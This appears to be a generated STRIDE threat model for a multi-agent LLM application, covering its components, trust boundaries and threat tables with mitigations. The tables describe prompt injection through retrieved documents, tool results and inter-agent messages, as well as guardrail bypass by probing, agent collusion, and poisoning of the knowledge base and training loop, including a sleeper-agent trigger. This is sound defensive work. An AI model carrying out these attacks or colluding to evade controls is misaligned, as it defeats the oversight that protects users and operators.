---
schema_version: "1.6"
date: "2026-04-19"
input_format: "mermaid"
classification: "confidential"
run_id: "2026-04-19T03-20-30"
baseline:
  source: "/Users/david/Projects/tachi/examples/agentic-app/test-output/2026-04-19T02-53-49/threats.md"
  date: "2026-04-19"
  finding_count: 70
  run_id: "2026-04-19T02-53-49"
coverage_gate:
  status: "pass"
  gaps: []
has_attack_chains: true
has_agentic_patterns: true
has_source_attribution: true
---

# Threat Model — Agentic AI Application

## 1. System Overview

### Components

| Component | Type | Description |
|---|---|---|
| User | External Entity | Human user submitting prompts and receiving responses via HTTPS |
| Guardrails Service | Process | Input validation, content filtering, prompt rejection gating, and filtering event logging |
| LLM Agent Orchestrator | Process | Supervisor LLM that orchestrates task delegation to Specialist Agent and direct tool invocations via MCP Tool Server; sends responses to User |
| Specialist Agent | Process | Delegated worker agent performing specialized subtasks; receives tasks via Inter-Agent Communication Channel and invokes tools via MCP Tool Server |
| Inter-Agent Communication Channel | Process | Message routing substrate for delegation messages between Orchestrator and Specialist Agent |
| MCP Tool Server | Process | MCP-compliant tool execution server that invokes External API and logs tool execution |
| Knowledge Base | Data Store | Vector knowledge store used by Orchestrator for context retrieval via vector search |
| Audit Logger | Data Store | Append-only audit trail collecting decision logs from Orchestrator, Specialist, ToolServer, and Guardrails; provides training signal stream to Learning Loop |
| Long-Running Learning Loop | Process | Periodic model update pipeline consuming audit log training signals and issuing model updates to Orchestrator and Specialist |
| External API | External Entity | Third-party external API invoked by MCP Tool Server via HTTPS |

### Data Flows

| Source | Destination | Data | Protocol |
|---|---|---|---|
| User | Guardrails Service | Prompt / Query | HTTPS |
| Guardrails Service | LLM Agent Orchestrator | Validated Prompt | Internal |
| Guardrails Service | User | Rejected Prompt + Reason | HTTPS |
| LLM Agent Orchestrator | Knowledge Base | Context Retrieval (Vector Search) | Internal |
| Knowledge Base | LLM Agent Orchestrator | Retrieved Documents | Internal |
| LLM Agent Orchestrator | Inter-Agent Communication Channel | Delegation Message | Internal |
| Inter-Agent Communication Channel | Specialist Agent | Delegated Task | Internal |
| Specialist Agent | Inter-Agent Communication Channel | Specialist Result | Internal |
| Inter-Agent Communication Channel | LLM Agent Orchestrator | Aggregated Result | Internal |
| LLM Agent Orchestrator | MCP Tool Server | Tool Call Request | JSON-RPC |
| Specialist Agent | MCP Tool Server | Tool Call Request | JSON-RPC |
| MCP Tool Server | LLM Agent Orchestrator | Tool Result | JSON-RPC |
| MCP Tool Server | Specialist Agent | Tool Result | JSON-RPC |
| MCP Tool Server | External API | API Request | HTTPS |
| External API | MCP Tool Server | API Response | HTTPS |
| LLM Agent Orchestrator | User | Response | HTTPS |
| LLM Agent Orchestrator | Audit Logger | Decision Log Entry | Internal |
| Specialist Agent | Audit Logger | Decision Log Entry | Internal |
| MCP Tool Server | Audit Logger | Tool Execution Log | Internal |
| Guardrails Service | Audit Logger | Filtering Event Log | Internal |
| Audit Logger | Long-Running Learning Loop | Training Signal Stream | Internal |
| Long-Running Learning Loop | LLM Agent Orchestrator | Periodic Model Update | Internal |
| Long-Running Learning Loop | Specialist Agent | Periodic Model Update | Internal |

### Technologies

| Category | Technology | Version (if known) |
|---|---|---|
| Transport | HTTPS / TLS | unknown |
| Protocol | JSON-RPC | 2.0 |
| AI Framework | LLM (large language model) | unknown |
| Tool Protocol | MCP (Model Context Protocol) | unknown |
| Storage | Vector Database / Knowledge Base | unknown |
| Storage | Audit Log Store | unknown |
| Pattern | RAG (Retrieval-Augmented Generation) | n/a |

---

## 2. Trust Boundaries

### Trust Zones

| Zone | Trust Level | Components |
|---|---|---|
| User Zone | Untrusted | User |
| Application Zone | Trusted | Guardrails Service, LLM Agent Orchestrator, Specialist Agent, Inter-Agent Communication Channel, MCP Tool Server, Knowledge Base, Audit Logger, Long-Running Learning Loop |
| External Services | Semi-Trusted | External API |

### Boundary Crossings

| Crossing | From Zone | To Zone | Components | Controls |
|---|---|---|---|---|
| User → Guardrails | User Zone | Application Zone | User → Guardrails Service | HTTPS transport; content filtering; prompt rejection |
| Guardrails → User (rejection) | Application Zone | User Zone | Guardrails Service → User | HTTPS transport |
| Orchestrator → User (response) | Application Zone | User Zone | LLM Agent Orchestrator → User | HTTPS transport |
| ToolServer → External API | Application Zone | External Services | MCP Tool Server → External API | HTTPS transport |
| External API → ToolServer | External Services | Application Zone | External API → MCP Tool Server | HTTPS transport |

---

## 3. STRIDE Threat Tables

### 3.1 Spoofing (S)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|
| S-1 | [UNCHANGED] | User | L7 — Agent Ecosystem | trust_exploitation | An attacker impersonates a legitimate user by replaying stolen session tokens or forging identity credentials to bypass authentication at the User→Guardrails boundary, gaining unauthorized access to the system under a victim identity. | HIGH | HIGH | Critical | Implement short-lived JWT or session tokens with binding to client IP/device fingerprint. Enforce MFA for all user sessions. Use token revocation lists and refresh-token rotation with binding checks. |
| S-2 | [UNCHANGED] | Guardrails Service | L6 — Security and Compliance | — | An attacker spoofs the Guardrails Service by sending crafted requests directly to the LLM Agent Orchestrator's internal endpoint, bypassing validation entirely. If internal service endpoints lack mutual TLS authentication, any service within the Application Zone can impersonate the Guardrails. | MEDIUM | HIGH | High | Enforce mutual TLS (mTLS) between Guardrails Service and LLM Agent Orchestrator. Use service mesh identity (e.g., SPIFFE/SPIRE) to authenticate intra-zone service-to-service calls. Never expose the Orchestrator endpoint to unauthenticated internal callers. |
| S-3 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | trust_exploitation | The Orchestrator's identity is not cryptographically attested to the Specialist Agent via the Inter-Agent Communication Channel. A compromised or rogue process could inject messages into the channel impersonating the Orchestrator, issuing unauthorized delegation instructions to the Specialist Agent. | HIGH | HIGH | Critical | Authenticate all Orchestrator→Channel messages using HMAC or asymmetric signing with per-session keys. The Specialist Agent MUST verify the signature before acting on delegated tasks. Implement a nonce/replay-prevention field in every delegation message. |
| S-4 | [UNCHANGED] | Specialist Agent | Unclassified | trust_exploitation | The Specialist Agent impersonates the Orchestrator when returning results to the Inter-Agent Communication Channel. A compromised Specialist Agent could inject fabricated "Aggregated Results" back to the Orchestrator, making unauthorized actions appear to have originated from valid specialist work. | MEDIUM | HIGH | High | Sign all Specialist→Channel messages with the Specialist's own identity key. The Orchestrator MUST verify the result's origin before incorporating it into its context or acting on it. |
| S-5 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | trust_exploitation | The Channel is a shared message routing substrate with no inherent sender authentication. A malicious process in the Application Zone can inject messages impersonating either the Orchestrator or the Specialist Agent, enabling unauthorized task injection or result fabrication. | HIGH | HIGH | Critical | Implement per-message digital signatures (ED25519 or HMAC-SHA256) on all messages transiting the Channel. Bind sender identity to each message envelope. Reject unsigned or unverifiable messages without processing. |
| S-6 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | trust_exploitation | An attacker in the Application Zone spoofs a valid agent (Orchestrator or Specialist) to submit unauthorized tool call requests to the MCP Tool Server. Without caller authentication, any process can invoke tools with the server's external-facing credentials. | HIGH | HIGH | Critical | Enforce caller authentication on all JSON-RPC endpoints. Each agent (Orchestrator, Specialist) must present a signed caller token or mTLS certificate. The Tool Server must verify the caller's identity before executing any tool invocation. |
| S-7 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop accepts a Training Signal Stream from the Audit Logger without verifying the data source's integrity or authenticity. An attacker who compromises the Audit Logger can inject fabricated training signals, silently manipulating future model updates under the appearance of legitimate operational data. | HIGH | HIGH | Critical | Cryptographically sign each training signal batch at the Audit Logger before emission. The Learning Loop MUST verify the signature before ingestion. Implement provenance attestation for all training data. |
| S-8 | [UNCHANGED] | External API | Unclassified | — | The External API provider's identity is not verified beyond TLS certificate validation. An attacker performing DNS hijacking or a BGP route hijack can redirect the MCP Tool Server's outbound API calls to an attacker-controlled server that returns malicious tool results. | MEDIUM | HIGH | High | Implement certificate pinning on outbound HTTPS connections from MCP Tool Server to External API. Verify the leaf certificate's CN/SAN against the expected provider identity. Use HSTS with a preloaded entry where available. |

---

### 3.2 Tampering (T)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|
| T-1 | [UNCHANGED] | Guardrails Service | L6 — Security and Compliance | — | An attacker with write access to the Guardrails Service configuration (via a misconfigured admin endpoint or insider threat) modifies filtering rules to allow previously-blocked prompt patterns through to the Orchestrator, silently bypassing content policy enforcement. | MEDIUM | HIGH | High | Enforce configuration-as-code with cryptographic commit signing for all Guardrails rule updates. Require dual approval for rule changes. Audit every rule modification in the Audit Logger with immutable timestamps. Alert on any rule relaxation event. |
| T-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | The Orchestrator's context window (system prompt, retrieved documents, tool results) can be tampered with by an attacker who controls any upstream data source — the Knowledge Base, the Inter-Agent Channel (aggregated results), or tool call responses from the MCP Tool Server. Injecting adversarial content into the context manipulates the Orchestrator's reasoning and outputs. | HIGH | HIGH | Critical | Validate the integrity of all context sources before injecting into the Orchestrator's context window. Apply content-level hashing to retrieved documents at KB read time. Treat tool results as untrusted input and apply output encoding before context injection. |
| T-3 | [UNCHANGED] | Specialist Agent | Unclassified | — | The Specialist Agent's operational context can be tampered with by injecting adversarial content into the Delegated Task message via the Inter-Agent Communication Channel. A compromised message in the Channel can redirect the Specialist's actions, modify its tool call targets, or exfiltrate data via a fabricated task payload. | HIGH | HIGH | Critical | Validate and sanitize all task payloads received by the Specialist Agent before execution. Apply message integrity verification (HMAC or digital signature) on every received delegation message. Reject tasks containing unexpected structural patterns (new tool targets, exfiltration URLs). |
| T-4 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | communication_vulnerability | Messages transiting the Inter-Agent Communication Channel can be modified in transit by a process with access to the channel's message queue or shared memory. An agent-in-the-middle attack modifies delegation messages before delivery, redirecting specialist tasks or injecting malicious instructions without detection. | HIGH | HIGH | Critical | Apply end-to-end message integrity protection (digital signatures) at the channel layer. Messages MUST be signed by the sender and verified by the receiver independently of the channel's own transport security. Use message sequence numbers and monotonic counters to detect dropped or reordered messages. |
| T-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | — | Tool call request parameters supplied by agent LLM outputs can be tampered with before execution if the Tool Server does not validate them against an explicit allowlist. An attacker who can influence the Orchestrator's or Specialist's LLM output can modify JSON-RPC parameters to call unintended tools or supply malicious arguments (e.g., injecting shell metacharacters into tool parameters). | HIGH | HIGH | Critical | Implement strict parameter validation on all JSON-RPC tool invocations: validate parameter types, enforce allowlisted values for enumerable parameters (tool names, targets), and reject any request containing metacharacters or unexpected structural elements. Apply parameter-level allowlisting before tool dispatch. |
| T-6 | [UNCHANGED] | Knowledge Base | L2 — Data Operations | — | The Knowledge Base corpus can be tampered with (poisoned) by an attacker who gains write access. Injecting adversarial documents into the knowledge store causes the Orchestrator to retrieve and incorporate malicious context during vector search, corrupting the Orchestrator's responses at scale. | MEDIUM | HIGH | High | Implement write access controls on the Knowledge Base with least-privilege service accounts. Log all writes with immutable audit trails. Apply document-level integrity checks (hash + signature) at write time; verify at retrieval time. Regularly scan the corpus for adversarial content patterns. |
| T-7 | [UNCHANGED] | Audit Logger | L5 — Evaluation and Observability | — | The Audit Logger entries can be tampered with by a process with write access to the log store. Modifying or deleting log entries corrupts the training signal stream consumed by the Long-Running Learning Loop, causing poisoned model updates, and also destroys forensic evidence needed for incident response. | MEDIUM | HIGH | High | Implement the Audit Logger as an append-only store (no update/delete operations). Cryptographically hash log batches (Merkle tree) to detect any post-write modification. Store a log hash chain externally (in a separate immutable store) that cannot be altered without detection. |
| T-8 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The training signal stream from the Audit Logger to the Learning Loop can be poisoned (data poisoning attack) by injecting adversarial entries into the Audit Logger before training runs. A time-delayed attack (temporal attack pattern) inserts adversarial training signals that activate only when a specific trigger pattern appears in future user prompts — a sleeper-agent injection via the model update cycle. | HIGH | HIGH | Critical | Apply training data provenance attestation: each log entry must carry a verifiable origin signature. Implement anomaly detection on training signal distributions to detect adversarial drift. Limit the influence of any single data source on model parameters; implement gradient clipping and differential privacy during training. |

---

### 3.3 Repudiation (R)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|
| R-1 | [UNCHANGED] | User | L7 — Agent Ecosystem | — | A user denies having submitted a particular prompt or query, claiming the record in the Audit Logger was falsified. Without request signing or non-repudiation controls at the User→Guardrails boundary, the system cannot prove the user submitted a specific input. | MEDIUM | MEDIUM | Medium | Implement request signing at the client layer (e.g., signed HTTP requests with a user-held private key). Log the signed request hash in the Audit Logger alongside the session identity. Use timestamped, immutable audit entries to establish proof of submission. |
| R-2 | [UNCHANGED] | Guardrails Service | L6 — Security and Compliance | — | The Guardrails Service can deny having logged a filtering event or claim that an input passed filtering when it was actually rejected (or vice versa). Without tamper-evident logs, the filtering pipeline's decisions cannot be verified independently. | MEDIUM | MEDIUM | Medium | All Guardrails filtering decisions (pass and reject) MUST be logged to the Audit Logger with a hash of the evaluated prompt, the rule applied, and a monotonic sequence number. Ensure log entries are written atomically before the filtering response is returned. |
| R-3 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | The Orchestrator denies having issued a specific delegation message or tool call request, claiming the action was performed by another process. Without per-action logging of Orchestrator-originated actions with content hashes, the Orchestrator's operational history cannot be audited. | HIGH | HIGH | Critical | Log every Orchestrator action (delegation messages, tool call requests, response generation) to the Audit Logger with: (a) the action type and content hash, (b) the session/request ID, (c) a monotonic sequence number, (d) a signature using the Orchestrator's service key. Actions MUST be logged before execution, not after. |
| R-4 | [UNCHANGED] | Specialist Agent | Unclassified | — | The Specialist Agent denies having executed a tool call or produced a specific result. Without signed, non-repudiable decision logs, the Specialist's actions cannot be attributed. | MEDIUM | HIGH | High | Log every Specialist Agent action (received task, tool calls invoked, result produced) to the Audit Logger with content hashes and a signature using the Specialist's service key. Log entries MUST precede the corresponding action. |
| R-5 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | — | The Channel denies having delivered or modified a specific message. Without delivery receipts and message integrity records, it is impossible to determine whether a message was delivered as sent or was modified in transit. | LOW | MEDIUM | Low | Implement message delivery acknowledgments (ACKs) that include the hash of the received message content. Store ACK records in the Audit Logger. If the sender's message hash and the receiver's ACK hash do not match, flag for investigation. |
| R-6 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | — | The MCP Tool Server denies having executed a specific tool invocation or received a particular JSON-RPC request. Without signed execution logs, tool invocations cannot be attributed to the requesting agent. | MEDIUM | HIGH | High | Log every JSON-RPC tool invocation to the Audit Logger before execution: the calling agent's identity (verified from the caller token), the tool name, all parameters (hashed for PII), and the resulting output (hashed). Log entries MUST be written atomically before tool execution begins. |
| R-7 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop denies having applied a specific model update or claims that an update was applied with different training data than what is recorded. Without cryptographic provenance, model updates cannot be attributed to specific training runs or data sources. | MEDIUM | HIGH | High | Log every model update event: training data set hash, parameter diff hash, update timestamp, and approval signature. Store model update provenance records in an immutable, externally-verifiable store. Implement model versioning with signed manifests. |
| R-8 | [UNCHANGED] | External API | Unclassified | — | The External API provider denies having returned a specific response to the MCP Tool Server, enabling disputes over what data was received and acted upon. | LOW | MEDIUM | Low | Log all External API responses (with content hash and timestamp) in the Audit Logger immediately upon receipt. Implement request/response signing protocols with the API provider where supported (e.g., webhook signatures). |

---

### 3.4 Information Disclosure (I)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|
| I-1 | [UNCHANGED] | Guardrails Service | L6 — Security and Compliance | — | The Guardrails Service leaks the content of rejected prompts (including their rejection reasons) in error responses returned to the User. An attacker can iteratively probe the filtering rules by observing rejection reasons, enabling systematic bypass through adaptive prompt crafting. | MEDIUM | MEDIUM | Medium | Return generic rejection messages to the User that do not reveal the specific rule triggered (e.g., "Your request could not be processed" rather than "Blocked: contains jailbreak pattern X"). Log the detailed rejection reason internally to the Audit Logger only. |
| I-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | The Orchestrator's context window contains sensitive information (retrieved documents from the Knowledge Base, tool results, system prompts). A prompt injection attack or model hallucination can cause the Orchestrator to leak this context in its HTTPS response to the User, exposing system-internal data. | HIGH | HIGH | Critical | Implement output scrubbing on the Orchestrator's response before transmission to the User: detect and redact content that pattern-matches against known sensitive-data markers (system prompt preambles, KB document identifiers, tool response metadata). Apply a separate "response auditor" step that reviews the output before sending. |
| I-3 | [UNCHANGED] | Specialist Agent | Unclassified | — | The Specialist Agent receives sensitive data via delegated tasks (from the Orchestrator's context) and may include it verbatim in its results returned via the Inter-Agent Channel. If the Channel is observable or the results are logged without redaction, sensitive upstream data leaks downstream. | MEDIUM | HIGH | High | Apply data minimization to delegation messages: the Orchestrator MUST NOT include sensitive context in task payloads unless strictly required. Apply output scrubbing on Specialist results before logging or forwarding. Classify and label sensitive fields in inter-agent messages. |
| I-4 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | communication_vulnerability | Messages on the Inter-Agent Communication Channel are observable by any process in the Application Zone with access to the shared message bus or queue. Unencrypted or insufficiently access-controlled inter-agent messages expose sensitive task context to unauthorized observers. | HIGH | HIGH | Critical | Encrypt all inter-agent messages end-to-end (not just at the transport layer). Implement per-message encryption with keys derived from the sender-receiver pair. Apply strict access controls on the channel infrastructure (queue, shared memory) to prevent unauthorized reads by other Application Zone processes. |
| I-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | — | Tool results from External API calls may contain sensitive data (user records, financial data, PII) that the Tool Server logs verbatim to the Audit Logger. If Audit Logger access is not restricted, this data becomes accessible to any process that reads the audit trail, including the Learning Loop's training pipeline. | MEDIUM | HIGH | High | Implement structured logging with field-level classification: PII and sensitive tool result fields MUST be hashed or tokenized before writing to the Audit Logger. The Tool Server MUST apply a log-before-hash policy (hash the content, log the hash) rather than logging raw sensitive content. |
| I-6 | [UNCHANGED] | Knowledge Base | L2 — Data Operations | — | The Knowledge Base exposes its full document corpus to any process that can issue a vector search query. Without query-result access controls, a compromised Orchestrator or injected context can exfiltrate the entire corpus by issuing exhaustive search queries. | MEDIUM | HIGH | High | Implement query-result access controls: the Knowledge Base MUST enforce per-query result limits and per-session query budgets. Apply context-aware authorization to restrict retrieval to documents within the requesting session's permitted scope. Monitor for anomalous query patterns (high-volume, exhaustive retrievals). |
| I-7 | [UNCHANGED] | Audit Logger | L5 — Evaluation and Observability | — | The Audit Logger aggregates sensitive data from all Application Zone components. Unauthorized read access to the logger (misconfigured access controls, insider threat) exposes the full operational history of the agent system, including user prompts, model decisions, tool call parameters, and filter rule triggers. | HIGH | HIGH | Critical | Enforce strict read access controls on the Audit Logger: only designated incident-response and analytics service accounts should have read access. Encrypt log entries at rest with envelope encryption (per-batch keys stored in a hardware-secured key management service). Audit all read access to the log store. |
| I-8 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | — | The Learning Loop consumes the full Audit Logger training signal stream, which includes user prompts, agent decisions, and tool call parameters. If the trained model memorizes sensitive training data, it can inadvertently reproduce PII or proprietary information in its responses (training data extraction attack). | MEDIUM | HIGH | High | Apply differential privacy techniques during training to limit per-example memorization. Implement training data de-identification: strip PII, usernames, and session identifiers from training signals before ingestion. Apply canary injection to training data to detect and alert on memorization during post-training evaluation. |

---

### 3.5 Denial of Service (D)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|
| D-1 | [UNCHANGED] | Guardrails Service | L6 — Security and Compliance | — | The Guardrails Service is vulnerable to resource exhaustion via high-volume prompt submission. An attacker sends computationally expensive prompts (complex regex evaluation patterns, adversarially crafted inputs that maximize rule evaluation cost) at high rate to degrade or collapse the filtering pipeline. | HIGH | HIGH | Critical | Implement per-IP and per-session rate limiting at the network ingress (before the Guardrails Service). Apply a computational complexity budget per prompt evaluation; reject prompts that exceed the budget. Use asynchronous processing queues with backpressure to prevent synchronous overload. |
| D-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | resource_competition | The Orchestrator's inference pipeline is a bounded resource. An attacker (or malfunctioning upstream component) can exhaust the Orchestrator's capacity by flooding it with high-token-count prompts or by injecting context that forces recursive tool invocation chains. This starves legitimate user requests of Orchestrator capacity. | HIGH | HIGH | Critical | Implement per-session token budgets and hard context-window limits. Apply circuit breakers on tool invocation chains (maximum recursive depth per session). Use request queuing with priority tiers and capacity-based load shedding. Monitor for anomalous context-window utilization and alert/throttle outlier sessions. |
| D-3 | [UNCHANGED] | Specialist Agent | Unclassified | resource_competition | The Specialist Agent is invoked by the Orchestrator via the Inter-Agent Channel. An adversarially crafted delegation message that triggers computationally expensive subtasks can exhaust the Specialist Agent's processing capacity, preventing it from completing legitimate delegated work. | MEDIUM | HIGH | High | Apply per-task execution time limits and resource budgets on all Specialist Agent invocations. Implement task queue depth limits; reject or queue new delegation messages when the Specialist's queue depth exceeds a threshold. Use health-check probes from the Orchestrator to detect Specialist overload and apply backpressure. |
| D-4 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | resource_competition | The Channel's message queue can be flooded by a compromised agent or a malfunctioning process, causing legitimate messages to be dropped, delayed, or rejected. Queue saturation disrupts coordination between Orchestrator and Specialist Agent. | MEDIUM | HIGH | High | Implement message queue depth limits and per-sender rate limits at the Channel layer. Apply backpressure mechanisms: when the queue approaches capacity, reject new messages from the sender with a rate-limit response. Monitor queue depth metrics and alert on sustained high-water-mark conditions. |
| D-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | resource_competition | The Tool Server's capacity for concurrent External API calls is bounded by rate limits imposed by the API provider and by the Tool Server's own connection pool. A compromised agent sending high-volume tool call requests can exhaust the connection pool, causing all legitimate tool calls to fail. | HIGH | HIGH | Critical | Implement per-caller and per-tool rate limiting at the Tool Server. Enforce a connection pool limit with overflow rejection (not queuing) for requests exceeding the pool. Apply per-session tool call budgets. Use circuit breakers to isolate External API degradation from internal availability. |
| D-6 | [UNCHANGED] | Knowledge Base | L2 — Data Operations | — | The Knowledge Base can be rendered unavailable by an attacker who issues high-volume, complex vector search queries (exhaustive nearest-neighbor searches with high dimensionality). This degrades retrieval performance for the Orchestrator. | MEDIUM | MEDIUM | Medium | Implement per-session query rate limits and complexity bounds on vector search queries. Apply result caching for frequent queries to reduce backend load. Monitor query throughput and reject queries that exceed complexity thresholds. |
| D-7 | [UNCHANGED] | Audit Logger | L5 — Evaluation and Observability | — | The Audit Logger can be overwhelmed by a log-flooding attack from a compromised Application Zone process, causing legitimate log entries to be dropped or the logger to become unavailable, creating audit gaps and potentially cascading to block all pipeline operations that wait for log confirmation. | MEDIUM | HIGH | High | Decouple Audit Logger writes from the critical path: use asynchronous write queues so that log submission never blocks upstream components. Implement write rate limits per source component. Apply log rotation and capacity management to prevent disk exhaustion. Alert on abnormally high write rates from any single source. |
| D-8 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | — | The Learning Loop is a resource-intensive batch process. A high-volume data injection into the Audit Logger (training signal flooding) can cause the Learning Loop to enter runaway processing, consuming excessive compute resources and either blocking legitimate model updates or degrading system performance. | MEDIUM | MEDIUM | Medium | Implement training run scheduling with resource quotas (CPU, memory, time-to-completion). Apply training data volume limits per run: cap the number of training examples ingested per scheduled run. Use separate compute pools for the Learning Loop to prevent resource contention with the real-time inference pipeline. |

---

### 3.6 Elevation of Privilege (E)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|
| E-1 | [UNCHANGED] | Guardrails Service | L6 — Security and Compliance | — | A prompt injection attack that bypasses the Guardrails Service effectively elevates the attacker's privilege from "unauthenticated user" to "trusted caller of the Orchestrator". The attacker's prompt reaches the Orchestrator with the same trust level as validated internal inputs, enabling subsequent escalation. | HIGH | HIGH | Critical | Layer defense-in-depth: the Orchestrator MUST apply its own input validation independently of Guardrails. Do not treat Guardrails-passed inputs as implicitly trusted. Implement Orchestrator-level prompt injection detection as a separate control. Apply the principle of least-privilege to all Guardrails→Orchestrator data flows. |
| E-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | The Orchestrator has privileged access to the Knowledge Base, MCP Tool Server, and delegation authority over the Specialist Agent. A prompt injection attack that manipulates the Orchestrator's reasoning can cause it to self-authorize elevated operations: exfiltrating the full KB corpus, invoking tools outside the user's permitted scope, or issuing delegation messages that a normal user request should not trigger. | HIGH | HIGH | Critical | Implement per-session scoped permissions for the Orchestrator: the session's permitted tool set and KB access scope are determined at authentication time and enforced by the Tool Server and KB independently. The Orchestrator MUST NOT grant itself elevated capabilities at runtime. Apply step-up authentication for high-privilege operations. |
| E-3 | [UNCHANGED] | Specialist Agent | Unclassified | — | The Specialist Agent receives delegated permissions from the Orchestrator. If the delegation message is forged or tampered with (granting the Specialist elevated permissions beyond the original user session scope), the Specialist gains unauthorized capability to invoke tools or access data outside its permitted scope. | MEDIUM | HIGH | High | The MCP Tool Server MUST verify the Specialist's claimed permission scope against the originating user session's authorization at every tool invocation. Delegation messages MUST NOT be self-signed by the Orchestrator alone; they MUST be validated against a central session-authorization record. |
| E-4 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | — | If the Channel does not enforce sender authentication, any Application Zone process can inject messages with forged identity headers claiming elevated sender roles (e.g., claiming to be the Orchestrator to issue trusted delegation messages). This elevates the attacker from a low-privilege process to the Orchestrator's trust level. | HIGH | HIGH | Critical | Enforce sender identity authentication at the Channel layer: all messages MUST carry a verifiable sender credential (signed token or mTLS certificate). The Channel MUST reject messages whose sender credentials cannot be verified before routing. |
| E-5 | [UNCHANGED] | MCP Tool Server | L3 — Agent Framework | — | The MCP Tool Server executes tools with credentials it holds (service account tokens, API keys for External API). If an agent sends unauthorized tool calls (via forged identity or exploited Orchestrator), it gains the Tool Server's execution privileges — invoking external APIs, writing to external systems, and accessing data sources with the server's full credential set. | HIGH | HIGH | Critical | Implement zero-trust authorization at the Tool Server: each tool invocation MUST be authorized against the originating session's scope, independent of the caller's identity. Apply the principle of least-privilege for tool execution: tool-specific service accounts with minimum necessary external permissions. Rotate API credentials regularly. |
| E-6 | [UNCHANGED] | Long-Running Learning Loop | Unclassified | temporal_attack | The Learning Loop applies model updates with access to the Orchestrator and Specialist Agent model parameters. If the update mechanism is compromised (poisoned training data, unauthenticated update channel), an attacker elevates from data-layer access to model-parameter control, effectively gaining the ability to inject arbitrary behaviors into both agents via the next update cycle. | HIGH | HIGH | Critical | Authenticate and authorize all model update pushes: the Learning Loop MUST sign each model update package with an HSM-backed key. The Orchestrator and Specialist MUST verify the update signature before applying. Implement a staged rollout with A/B testing and behavioral regression checks before production deployment of any model update. |

---

## 4. AI Threat Tables

### 4.1 Agentic Threats (AG)

| ID | Status | Component | MAESTRO Layer | Agentic Pattern | Threat | OWASP Reference | Likelihood | Impact | Risk Level | Mitigation |
|---|---|---|---|---|---|---|---|---|---|---|
| AG-1 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | — | Prompt injection causes the Orchestrator to autonomously execute unauthorized high-impact actions (mass data exfiltration from KB, bulk tool invocations against External API) beyond the scope of the user's original request, exploiting the Orchestrator's broad access to system capabilities. | ASI-01 | HIGH | HIGH | Critical | Implement a scope-enforcement layer: the Orchestrator MUST validate every proposed action against the user session's permitted scope before execution. Apply human-in-the-loop confirmation for high-impact operations (bulk exports, external writes). Use a supervised-autonomy model: the Orchestrator proposes an action plan; a separate policy engine approves or rejects it. |
| AG-2 | [UNCHANGED] | LLM Agent Orchestrator | L1 — Foundation Model | agent_collusion | The Orchestrator and Specialist Agent can jointly coordinate (via the Inter-Agent Channel) to achieve a combined action that neither could perform alone or that would trigger per-agent rate limits if attempted individually. An attacker who compromises both agents (or injects coordinated prompts via the Inter-Agent Channel) can leverage this coordination for policy circumvention or joint data exfiltration. | ASI-01 | HIGH | HIGH | Critical | Implement cross-agent rate limits and coordination throttles at the Channel level. Log all inter-agent coordination patterns to the Audit Logger. Apply a policy engine that evaluates the combined effect of multi-agent action sequences. Enforce per-agent AND per-session action budgets independently. |
| AG-3 | [UNCHANGED] | Specialist Agent | Unclassified | trust_exploitation | The Specialist Agent, once delegated a task, operates autonomously without continuous Orchestrator oversight. An adversarially crafted delegation message can cause the Specialist to execute a sequence of tool calls that constitutes a prohibited action when viewed holistically — each individual call appears permitted, but the combination achieves an unauthorized outcome. | ASI-01 | HIGH | HIGH | Critical | Implement task-level intent verification: the Specialist MUST check that each tool invocation in a task sequence is consistent with the task's stated objective. Apply a "budget" on tool calls per task (maximum N calls); require re-authorization from the Orchestrator for task extensions. Log all tool call sequences for retrospective analysis. |
| AG-4 | [UNCHANGED] | Inter-Agent Communication Channel | Unclassified | trust_exploitation | The Channel is a shared substrate whose compromise enables agent-in-the-middle attacks: an attacker intercepts delegation messages, modifies the task parameters (replacing legitimate tool targets with attacker-controlled endpoints), and forwards the modified message to the Specialist Agent. The Specialist executes unauthorized actions believing the instructions came from the Orchestrator. | MCP-03 | HIGH | HIGH | Critical | Implement end-to-end message authentication with digital signatures (Orchestrator signs, Specialist verifies). The Channel itself MUST NOT be trusted for integrity — security MUST be at the message level. Implement replay detection (monotonic message counters, timestamp windows). |
